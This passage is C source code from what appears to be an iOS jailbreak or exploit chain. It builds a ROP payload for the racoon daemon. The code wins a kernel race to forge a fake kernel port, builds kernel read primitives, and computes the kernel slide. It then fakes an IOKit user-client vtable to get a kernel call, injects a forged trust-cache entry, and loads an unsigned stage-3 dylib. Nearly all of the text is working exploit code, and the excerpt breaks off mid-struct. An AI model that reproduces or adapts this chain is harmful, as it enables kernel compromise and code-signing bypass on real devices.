	char * dylib_str = malloc(100);
	memset(dylib_str,0,100);
	snprintf(dylib_str,100,"/usr/sbin/racoon.dylib");
	DEFINE_ROP_VAR("dylib_str",100,dylib_str);

	// define log message we will log out later
	char * wedidit_msg = malloc(1024);
	memset(wedidit_msg,0,1024);
	snprintf(wedidit_msg,1024,"WE DID IT\n");
	DEFINE_ROP_VAR("WEDIDIT",1024,wedidit_msg);

	// get our own task port (I think in theory we could hardcode this but we can easily get it dynamically so who cares)
	ADD_COMMENT("mach_task_self");
	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name(offsets,"mach_task_self"),0,0,0,0,0,0,0,0);

	// get the reply port used to commuincate with io services
	ADD_COMMENT("get reply port");
	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),tmp);
	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);

	// block all the signals the racing threads use so that we don't recieve one by acciedent
	for (int i = 0; i < 4; i++){ 
		DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
		SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1+i)));
		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG("mysigmask",2);
		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
	}

	// get the mach host port 
	DEFINE_ROP_VAR("mach_host",sizeof(mach_port_t),tmp);
	CALL_FUNC_RET_SAVE_VAR("mach_host",get_addr_from_name(offsets,"mach_host_self"),0,0,0,0,0,0,0,0);

	// and with that the master port
	DEFINE_ROP_VAR("master_port",sizeof(mach_port_t),tmp);
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("mach_host",1);
	ROP_VAR_ARG("master_port",2);
	CALL("host_get_io_master",0,0,0,0,0,0,0,0);

	// the code below is there as a killswitch we will load boot-args (you can set that in recovery) from nvram and check if they have a specific value. If they do we spin

    // implementing IOServiceGetMatchingService
	// we can use the master port for that basically
    CFMutableDictionaryRef nvram_dict = IOServiceMatching("IODTNVRAM");
    CFDataRef nvram_serialized = IOCFSerialize(nvram_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
    CFRelease(nvram_dict);
	uint64_t nvram_data_length = CFDataGetLength(nvram_serialized);

    // TODO: move those structs into a seperate file
    struct GetMatchingService_Request {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_msg_type_number_t matchingCnt;
        char matching[4096];
    };

    struct GetMatchingService_Reply {
        mach_msg_header_t Head;
        mach_msg_body_t body;
        mach_msg_port_descriptor_t service;
        mach_msg_trailer_t trailer;
    };

    struct GetMatchingService_Request * nvram_request = malloc(sizeof(struct GetMatchingService_Request));
    memset(nvram_request,0,sizeof(struct GetMatchingService_Request));
    nvram_request->NDR = NDR_record;
    nvram_request->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
    nvram_request->Head.msgh_id = 2880;
    nvram_request->Head.msgh_reserved = 0;
    nvram_request->matchingCnt = nvram_data_length;
    memcpy(nvram_request->matching,CFDataGetBytePtr(nvram_serialized),nvram_data_length);

    DEFINE_ROP_VAR("nvram_request",sizeof(struct GetMatchingService_Request),nvram_request);
    ROP_VAR_CPY_W_OFFSET("nvram_request",offsetof(struct GetMatchingService_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
    ROP_VAR_CPY_W_OFFSET("nvram_request",offsetof(struct GetMatchingService_Request,Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));

    ROP_VAR_ARG_HOW_MANY(2);
    ROP_VAR_ARG("nvram_request",1);
    ROP_VAR_ARG64("reply_port",5);
    CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((nvram_data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);

	DEFINE_ROP_VAR("nvram_service",sizeof(mach_port_t),tmp);

	// now we have a port to the nvram service accessible from racoons sandbox and can interact with it (in this case we just use it to read out the boot-args)


    ROP_VAR_CPY_W_OFFSET("nvram_service",0,"nvram_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));


	struct get_property_request {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t property_nameOffset;
		mach_msg_type_number_t property_nameCnt;
		char property_name[12];
		mach_msg_type_number_t dataCnt;
	};

	struct get_property_reply {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t dataCnt;
		char data[4096];
		mach_msg_trailer_t trailer;
	};

	union get_property_union {
		struct get_property_request request;
		struct get_property_reply reply;
	};

	union get_property_union * get_property_msg = malloc(sizeof(union get_property_union));
	memset(get_property_msg,0,sizeof(union get_property_union));

	get_property_msg->request.NDR = NDR_record;
	get_property_msg->request.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    get_property_msg->request.Head.msgh_reserved = 0;
	get_property_msg->request.Head.msgh_id = 2812;
	get_property_msg->request.dataCnt = 4096;
	snprintf((char*)&get_property_msg->request.property_name,12,"boot-args");
	get_property_msg->request.property_nameCnt = strlen((char*)&get_property_msg->request.property_name);

	DEFINE_ROP_VAR("get_property_msg",sizeof(union get_property_union),get_property_msg);
	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
	ROP_VAR_CPY_W_OFFSET("get_property_msg",offsetof(union get_property_union,request.Head.msgh_remote_port),"nvram_service",0,sizeof(mach_port_t));
																																																									
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("get_property_msg",1);
	ROP_VAR_ARG64("reply_port",5);
	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct get_property_request), sizeof(struct get_property_reply),0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);

	// setup the compare string ("this boy needs some milk")
	char * cmp_str = malloc(100);
	memset(cmp_str,0,100);
	snprintf(cmp_str,100,"this boy needs some milk");
	DEFINE_ROP_VAR("cmp_str",100,cmp_str);
	DEFINE_ROP_VAR("strcmp_retval",8,tmp);
	// call strcmp and save the ret value
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("cmp_str",1);
	ROP_VAR_ARG_W_OFFSET("get_property_msg",2,offsetof(struct get_property_reply,data));
	CALL_FUNC_RET_SAVE_VAR("strcmp_retval",get_addr_from_name(offsets,"strcmp"),0,0,0,0,0,0,0,0);

#define ADD_USLEEP(usec) \
	ROP_VAR_ARG_HOW_MANY(1); \
	ROP_VAR_ARG64("reply_port",5); \
	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);

	ADD_LOOP_START("killswitch loop")
		// set x0 to the value of strcmp
		SET_X0_FROM_ROP_VAR("strcmp_retval");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("killswitch loop");

		ADD_USLEEP(1000); // if not just sleep and do that in an endless loop (TODO: can't we call exit here also? I think this might be an issue with keep alive tho so it's prob better to spin)
	ADD_LOOP_END();



	// implementing IOServiceGetMatchingService
	CFMutableDictionaryRef myservice_dict = IOServiceMatching("IOPMrootDomain");
	CFDataRef myservice_serialized = IOCFSerialize(myservice_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
	CFRelease(myservice_dict);
	uint64_t data_length = CFDataGetLength(myservice_serialized);

	struct GetMatchingService_Request * service_request = malloc(sizeof(struct GetMatchingService_Request));
	memset(service_request,0,sizeof(struct GetMatchingService_Request));
	service_request->NDR = NDR_record;
	service_request->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
	service_request->Head.msgh_id = 2880;
	service_request->Head.msgh_reserved = 0;
	service_request->matchingCnt = data_length;
	memcpy(service_request->matching,CFDataGetBytePtr(myservice_serialized),data_length);

	DEFINE_ROP_VAR("service_request",sizeof(struct GetMatchingService_Request),service_request);
	ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
	ROP_VAR_CPY_W_OFFSET("service_request",offsetof(struct GetMatchingService_Request,Head.msgh_remote_port),"master_port",0,sizeof(mach_port_t));

	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("service_request",1);
	ROP_VAR_ARG64("reply_port",5);
	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct GetMatchingService_Request)-4096+((data_length+3) & ~3), sizeof(struct GetMatchingService_Reply), 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);

	ROP_VAR_CPY_W_OFFSET("service",0,"service_request",offsetof(struct GetMatchingService_Reply,service.name),sizeof(mach_port_t));

	// IOServiceOpen
	
	// TODO: move those structs into a seperate file
	struct ServiceOpen_Request {
		mach_msg_header_t Head;
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t owningTask;
		mach_msg_ool_descriptor_t properties;
		NDR_record_t NDR;
		uint32_t connect_type;
		NDR_record_t ndr;
		mach_msg_type_number_t propertiesCnt;
	};

	struct ServiceOpen_Reply {
		mach_msg_header_t Head;
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t connection;
		NDR_record_t NDR;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	};

	struct ServiceOpen_Request * service_open_request = malloc(sizeof(struct ServiceOpen_Request));
	memset(service_open_request,0,sizeof(struct ServiceOpen_Request));
	service_open_request->msgh_body.msgh_descriptor_count = 2;
	service_open_request->owningTask.disposition = 19;
	service_open_request->owningTask.type = MACH_MSG_PORT_DESCRIPTOR;

	/* .address .size is already 0 because of the memset */
	service_open_request->properties.deallocate = false; /* guess that's also 0 */
	service_open_request->properties.copy = MACH_MSG_PHYSICAL_COPY;
	service_open_request->properties.type = MACH_MSG_OOL_DESCRIPTOR;

	service_open_request->NDR = NDR_record;
	service_open_request->connect_type = 0;
	service_open_request->ndr = NDR_record;

	// .propertiesCnt is also 0 */
	
	service_open_request->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
	service_open_request->Head.msgh_id = 2862;
	service_open_request->Head.msgh_reserved = 0;

	DEFINE_ROP_VAR("service_open_request",sizeof(struct ServiceOpen_Request),service_open_request);
	
	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,Head.msgh_remote_port),"service",0,sizeof(mach_port_t));
	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,Head.msgh_local_port),"reply_port",0,sizeof(mach_port_t));
	ROP_VAR_CPY_W_OFFSET("service_open_request",offsetof(struct ServiceOpen_Request,owningTask.name),"self",0,sizeof(mach_port_t));

	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("service_open_request",1);
	ROP_VAR_ARG64("reply_port",5);
	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct ServiceOpen_Request),sizeof(struct ServiceOpen_Reply),0,MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);

	// client is now a client of the rootdomainUC
	ROP_VAR_CPY_W_OFFSET("client",0,"service_open_request",offsetof(struct ServiceOpen_Reply,connection.name),sizeof(mach_port_t));


	// TODO: move that into install.m or somewhere else (prob even better to put it into offsets straight away)
#define BARRIER_BUFFER_SIZE 0x10000
	// spawn racer threads
	
	// TODO: move this struct into a seperate file
#define _STRUCT_ARM_THREAD_STATE64	struct __darwin_arm_thread_state64
_STRUCT_ARM_THREAD_STATE64
{
	__uint64_t    __x[29];	/* General purpose registers x0-x28 */
	__uint64_t    __fp;		/* Frame pointer x29 */
	__uint64_t    __lr;		/* Link register x30 */
	__uint64_t    __sp;		/* Stack pointer x31 */
	__uint64_t    __pc;		/* Program counter */
	__uint32_t    __cpsr;	/* Current program status register */
};

	// spawn the racer therad
	DEFINE_ROP_VAR("racer_kernel_thread",sizeof(thread_act_t),tmp);
	_STRUCT_ARM_THREAD_STATE64 * new_thread_state = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
	memset(new_thread_state,0,sizeof(_STRUCT_ARM_THREAD_STATE64));
	new_thread_state->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/ // we will point pc to longjump so that we can get into rop again easily
	new_thread_state->__x[0] = offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/; // this means we can easily just use a longjump buf at the front of the thread to control all regs
	DEFINE_ROP_VAR("thread_state",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state)
	ROP_VAR_ARG_HOW_MANY(3);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("thread_state",3);
	ROP_VAR_ARG("racer_kernel_thread",5);
	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
	

	// we need to wait for a short amout of time till the other thread called open
	// we can't call usleep on it's own so we just run our own implementation

	// TODO: we can prob remove this when we chown the log to mobile or change the permissions
	ADD_USLEEP(100);

	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16 (we could also use OSDATA objects like in the presentation but heh rootdomain will leak either way lol)

	// TODO: optimize this loop (we don't have to create a port on each try and the memleak_msg can leak 10 objs at once instead of calling the syscall 10 times) XXX: this would prob be a really good optimization acc
	ADD_LOOP_START("main_loop");
	
		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 

		// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG64("self",1);
		ROP_VAR_ARG("msg_port",3);
		CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
	
		ROP_VAR_ARG_HOW_MANY(3);
		ROP_VAR_ARG64("self",1);
		ROP_VAR_ARG64("msg_port",2);
		ROP_VAR_ARG64("msg_port",3);
		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);

		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
		SET_ROP_VAR32("tmp_port",0); // make sure tmp_port really is zero

		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG("ool_msg",1);
		CALL("mach_msg",0,MACH_SEND_MSG,ool_message->head.msgh_size,0,0,0,0,0);

		// no need for another loop in rop... we can just unroll this one here
		
		ROP_VAR_CPY_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0,sizeof(mach_port_t)); // set memleak_msg->Head.msgh_request_port
		for (int i = 0; i < 10; i++) {
			ROP_VAR_ARG_HOW_MANY(1);
			ROP_VAR_ARG("memleak_msg",1);
			CALL("mach_msg",0,MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(MEMLEAK_msg),0,0,0,0,0);
		}

		ROP_VAR_CPY_W_OFFSET("ool_msg_recv", offsetof(ool_message_struct,head.msgh_local_port),"msg_port",0,sizeof(mach_port_t));

		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG("ool_msg_recv",1);
		ROP_VAR_ARG64("msg_port",5);
		CALL("mach_msg",0,MACH_RCV_MSG,0,sizeof(ool_message_struct),0,0,0,0);


		// check if we found a port:

		// copy the descriptor address into it's own var
		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2,offsetof(ool_message_struct,desc[0].address));
		ROP_VAR_ARG("desc_addr",1);
		CALL("memcpy",0,0,8,0,0,0,0,0);

		// copy the first 4 bytes at the descriptor address into the_one
		ROP_VAR_ARG_HOW_MANY(2);
		ROP_VAR_ARG("the_one",1);
		ROP_VAR_ARG64("desc_addr",2);
		CALL("memcpy",0,0,4,0,0,0,0,0);

		// set x0 to the_one
		SET_X0_FROM_ROP_VAR("the_one");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("main_loop");

	ADD_LOOP_END();

	// we now got a port int the_one pointing to our fakeport struct in userland/the sysctl buffer
	// Now you need to watchout because for the SMAP version you would need to copy the fakeport struct into the sysctl buffer every time basically

	SET_ROP_VAR64("should_race",1); // stop the other thread

	// tell the console that we won the race
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("WEDIDIT",2);
	CALL("write",2,0,1024,0,0,0,0,0);

	ROP_VAR_ARG_HOW_MANY(3);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG64("the_one",2);
	ROP_VAR_ARG64("the_one",3);
	CALL("mach_port_insert_right",0,0,0,MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);

	// get kernel slide (this wouldn't be needed for the SMAP version)
	// alloc new valid port 
	DEFINE_ROP_VAR("notification_port",sizeof(mach_port_t),tmp);
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("notification_port",3);
	CALL("_kernelrpc_mach_port_allocate_trap",0,MACH_PORT_RIGHT_RECEIVE,0,0,0,0,0,0);

	// set notification port on our fake port so that we can read back the pointer
	ROP_VAR_ARG_HOW_MANY(4);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG64("the_one",2);
	ROP_VAR_ARG64("notification_port",5);
	ROP_VAR_ARG("tmp_port",7);
	CALL("mach_port_request_notification",0,0,MACH_NOTIFY_PORT_DESTROYED, 0, 0, MACH_MSG_TYPE_MAKE_SEND_ONCE,0,0);

	// get the heap addr
	DEFINE_ROP_VAR("heap_addr",sizeof(uint64_t),tmp);
	ROP_VAR_CPY_W_OFFSET("heap_addr",0,"fakeport",offsetof(kport_t,ip_pdrequest) /*offset of fakeport.ip_pdrequest*/,sizeof(uint64_t));

	
	// setup kr32
	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", offsetof(kport_t,ip_requests) /*offset of fakeport.ip_requests*/,"ip_requests_buf",0);

	DEFINE_ROP_VAR("out_sz",8,tmp);
	SET_ROP_VAR64("out_sz",1);
#define kr32(addr_var,valuename) \
	ROP_VAR_CPY_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,0,8); \
	ROP_VAR_ARG_HOW_MANY(4); \
	ROP_VAR_ARG64("self",1); \
	ROP_VAR_ARG64("the_one",2); \
	ROP_VAR_ARG(valuename,4); \
	ROP_VAR_ARG("out_sz",5); \
	CALL("mach_port_get_attributes",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);


	// setup kr64

	DEFINE_ROP_VAR("tmp_32_val",8,tmp);
	DEFINE_ROP_VAR("upper_32_bits_addr",8,tmp);
#define kr64(addr_val,valuename) \
	SET_ROP_VAR64("upper_32_bits_addr",4); \
	ROP_VAR_ADD("upper_32_bits_addr","upper_32_bits_addr",addr_val); \
	kr32("upper_32_bits_addr","tmp_32_val"); \
	kr32(addr_val,valuename); \
	ROP_VAR_CPY_W_OFFSET(valuename,4,"tmp_32_val",0,4);	

	// get recv addr from heap addr
	DEFINE_ROP_VAR("recv_heap_addr",8,tmp);
	DEFINE_ROP_VAR("heap_addr_recv_ptr",8,tmp);
	SET_ROP_VAR64("heap_addr_recv_ptr",offsetof(kport_t,ip_receiver));
	ROP_VAR_ADD("heap_addr_recv_ptr","heap_addr_recv_ptr","heap_addr");
	kr64("heap_addr_recv_ptr","recv_heap_addr");


	// get the task pointer from our recv addr
	DEFINE_ROP_VAR("task_pointer",8,tmp);
	DEFINE_ROP_VAR("heap_addr_task_ptr",8,tmp);
	SET_ROP_VAR64("heap_addr_task_ptr",offsets->is_task);
	ROP_VAR_ADD("heap_addr_task_ptr","heap_addr_task_ptr","recv_heap_addr");
	kr64("heap_addr_task_ptr","task_pointer");


	// register the client we have onto our task
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("self",1);
	ROP_VAR_ARG("client",2);
	CALL("mach_ports_register",0,0,1,0,0,0,0,0);

	// get the address of the client port
	DEFINE_ROP_VAR("ip_kobject_client_port",8,tmp);
	DEFINE_ROP_VAR("ip_kobject_ptr",8,tmp);
	SET_ROP_VAR64("ip_kobject_ptr",offsets->itk_registered);
	ROP_VAR_ADD("ip_kobject_ptr","ip_kobject_ptr","task_pointer");
	kr64("ip_kobject_ptr","ip_kobject_client_port");

	// get the UC obj
	DEFINE_ROP_VAR("kobj_client",8,tmp);
	DEFINE_ROP_VAR("kobj_client_ptr",8,tmp);
	SET_ROP_VAR64("kobj_client_ptr",offsetof(kport_t,ip_kobject));
	ROP_VAR_ADD("kobj_client_ptr","kobj_client_ptr","ip_kobject_client_port");
	kr64("kobj_client_ptr","kobj_client");

	// get the VTAB
	DEFINE_ROP_VAR("RootDomainUC_VTAB",8,tmp);
	kr64("kobj_client","RootDomainUC_VTAB");

	// get the slide
	DEFINE_ROP_VAR("kslide",8,tmp);
	SET_ROP_VAR64("kslide",((0xffffffffffffffff - offsets->rootdomainUC_vtab) + 1));
	ROP_VAR_ADD("kslide","kslide","RootDomainUC_VTAB");


	// fully setup trust chain entry now
	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
	DEFINE_ROP_VAR("bss_trust_chain_head_ptr",8,tmp);
	SET_ROP_VAR64("bss_trust_chain_head_ptr",offsets->trust_chain_head_ptr);
	ROP_VAR_ADD("bss_trust_chain_head_ptr","bss_trust_chain_head_ptr","kslide");
	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
	ROP_VAR_CPY_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0,8);

	CALL("seteuid",0,0,0,0,0,0,0,0); // we need to be root again otherwise we can't set eh swapprefix

	// this is now useing the sysctl buffer to place the trustcache in kernel memory and you would have to do the same for the fakeport for SMAP basically
	char * pattern = malloc(1024);
	for (int i = 0; i < 1024; i++) {
		pattern[i] = i;
	}
	DEFINE_ROP_VAR("swapprefix_buffer",1024,pattern);
	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),tmp);
	// using undocumented magic to get the integer name of vm.swapfileprefix
	char * name = "vm.swapfileprefix";
	int name2oid[2] = {0,3};
	int * real_oid = malloc(CTL_MAXNAME+2);
	size_t oidlen = CTL_MAXNAME+2;
	sysctl(name2oid,2,real_oid,&oidlen,name,strlen(name));
	DEFINE_ROP_VAR("swapprefix_oid",oidlen,real_oid);
	ROP_VAR_ARG_HOW_MANY(3);
	ROP_VAR_ARG("swapprefix_oid",1);
	ROP_VAR_ARG("swapprefix_buffer",3);
	ROP_VAR_ARG("swapprefix_length",4);
	CALL("sysctl",0,oidlen/4,0,0,0,0,0,0);
	// we just assume that the prefix isn't longer than 100 bytes
	ROP_VAR_CPY_W_OFFSET("swapprefix_buffer",100,"new_trust_chain_entry",0,sizeof(struct trust_chain));
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG("swapprefix_oid",1);
	ROP_VAR_ARG("swapprefix_buffer",5);
	CALL("sysctl",0,oidlen/4,0,0,0,1020/*100+sizeof(struct trust_chain)*/,0,0);

	// now the new trust chain entry is at swapprefix_addr + kslide + 100
	uint64_t * trust_chain_addr = malloc(sizeof(uint64_t));
	*trust_chain_addr = offsets->swapprefix_addr+100;
	DEFINE_ROP_VAR("new_trust_chain_entry_addr",8,trust_chain_addr);
	ROP_VAR_ADD("new_trust_chain_entry_addr","new_trust_chain_entry_addr","kslide");
	

#define VTAB_SIZE 0x100 // TODO: seperate file
	// setup fake vtab in userland
	// this would need to go into the kernel as well for the SMAP version
	DEFINE_ROP_VAR("UC_VTAB",VTAB_SIZE*8,tmp);
	DEFINE_ROP_VAR("tmp_uint64",8,tmp);
	DEFINE_ROP_VAR("vtab_ptr",8,tmp);
	ROP_VAR_CPY("vtab_ptr","RootDomainUC_VTAB",8);
	// unroll that loop cause loops in ROP are inefficent
	for (int i = 0; i < VTAB_SIZE; i++) {
		kr64("vtab_ptr","tmp_uint64");
		ROP_VAR_CPY_W_OFFSET("UC_VTAB",i*8,"tmp_uint64",0,8);
		SET_ROP_VAR64("tmp_uint64",8);
		ROP_VAR_ADD("vtab_ptr","vtab_ptr","tmp_uint64");
	}

	// turn the_one into a fake UC port
	
	// create a fake UC
	DEFINE_ROP_VAR("fake_client",VTAB_SIZE*8,tmp);
	
	DEFINE_ROP_VAR("root_domain_ptr",8,tmp);
	ROP_VAR_CPY("root_domain_ptr","kobj_client",8);
	for (int i = 0; i < VTAB_SIZE; i++) {
		kr64("root_domain_ptr","tmp_uint64");
		ROP_VAR_CPY_W_OFFSET("fake_client",i*8,"tmp_uint64",0,8);
		SET_ROP_VAR64("tmp_uint64",8);
		ROP_VAR_ADD("root_domain_ptr","root_domain_ptr","tmp_uint64");
	}
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fake_client",0,"UC_VTAB",0);

	// update fakeport as iokit obj
	SET_ROP_VAR32_W_OFFSET("fakeport",IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT,offsetof(kport_t,ip_bits));

#undef kr32
#undef kr64

	// insert new fake client
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport",offsetof(kport_t,ip_kobject),"fake_client",0);
	//SET_ROP_VAR64_W_OFFSET("fakeport",0x4141414141414140,offsetof(kport_t,ip_kobject));
	
	// patch getExternalTrapForIndex
	SET_ROP_VAR64("tmp_uint64",offsets->gadget_add_x0_x0_ret);
	ROP_VAR_ADD("tmp_uint64","tmp_uint64","kslide");
	ROP_VAR_CPY_W_OFFSET("UC_VTAB",(0xb7*8),"tmp_uint64",0,8);

	// copyin new head
	
	// setup call primitive
	DEFINE_ROP_VAR("copyin_func_ptr",8,tmp);
	SET_ROP_VAR64("copyin_func_ptr",offsets->copyin);
	ROP_VAR_ADD("copyin_func_ptr","copyin_func_ptr","kslide");
	ROP_VAR_CPY_W_OFFSET("fake_client",0x48,"copyin_func_ptr",0,8);
	// setup x0
	SET_ROP_VAR64_TO_VAR_W_OFFSET("fake_client",0x40,"new_trust_chain_entry_addr",0);
	SET_ROP_VAR64_W_OFFSET("fake_client",0,0x50); // set 0x50 to 0

	// fire
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("the_one",1);
	ROP_VAR_ARG64("bss_trust_chain_head_ptr",3);
	CALL("IOConnectTrap6",0,0,0,8,0,0,0,0);

	// ghetto dlopen
	// get a file descriptor for that dylib
	DEFINE_ROP_VAR("dylib_fd",8,tmp);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("dylib_str",1);
	CALL_FUNC_RET_SAVE_VAR("dylib_fd",get_addr_from_name(offsets,"open"),0,O_RDONLY,0,0,0,0,0,0);
	// add codesignature to the vnode
	// mmap the blob
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG64("dylib_fd",5);
	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE,0,0,0,0);
	fsignatures_t * siginfo = malloc(sizeof(fsignatures_t));
	memset(siginfo,0,sizeof(fsignatures_t));
	siginfo->fs_blob_start = (void*)(offsets->stage3_loadaddr + offsets->stage3_CS_blob);
	siginfo->fs_blob_size = offsets->stage3_CS_blob_size;
	DEFINE_ROP_VAR("siginfo",sizeof(fsignatures_t),siginfo);
	ROP_VAR_ARG_HOW_MANY(2);
	ROP_VAR_ARG64("dylib_fd",1);
	ROP_VAR_ARG("siginfo",3);
	CALL_FUNC(offsets->fcntl_raw_syscall,0,F_ADDSIGS,0,0,0,0,0,0);
	// map it at a fixed address (this will smash the blob)
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG64("dylib_fd",5);
	CALL("__mmap",offsets->stage3_loadaddr,offsets->stage3_size,PROT_EXEC|PROT_READ,MAP_FIXED|MAP_PRIVATE,0,offsets->stage3_fileoffset,0,0);

	// populate the struct we pass over to stage 3 with all the values it needs
	typedef struct {
		struct {
			kptr_t kernel_image_base;
		} constant;

		struct {
			kptr_t copyin;
			kptr_t copyout;
			kptr_t current_task;
			kptr_t get_bsdtask_info;
			kptr_t vm_map_wire_external;
			kptr_t vfs_context_current;
			kptr_t vnode_lookup;
			kptr_t osunserializexml;
			kptr_t smalloc;

			kptr_t ipc_port_alloc_special;
			kptr_t ipc_kobject_set;
			kptr_t ipc_port_make_send;
		} funcs;

		struct {
			kptr_t add_x0_x0_ret;
		} gadgets;

		struct {
			kptr_t realhost;
			kptr_t zone_map;
			kptr_t kernel_task;
			kptr_t kern_proc;
			kptr_t rootvnode;
			kptr_t osboolean_true;
			kptr_t trust_cache;
		} data;

		struct {
			kptr_t iosurface_root_userclient;
		} vtabs;

		struct {
			uint32_t is_task_offset;
			uint32_t task_itk_self;
			uint32_t itk_registered;
			uint32_t ipr_size;
			uint32_t sizeof_task;
			uint32_t task_all_image_info_addr;
			uint32_t task_all_image_info_size;
		} struct_offsets;

		struct {
			uint32_t create_outsize;
			uint32_t create_surface;
			uint32_t set_value;
		} iosurface;

		struct {
			void (*write) (int fd,void * buf,uint64_t size);
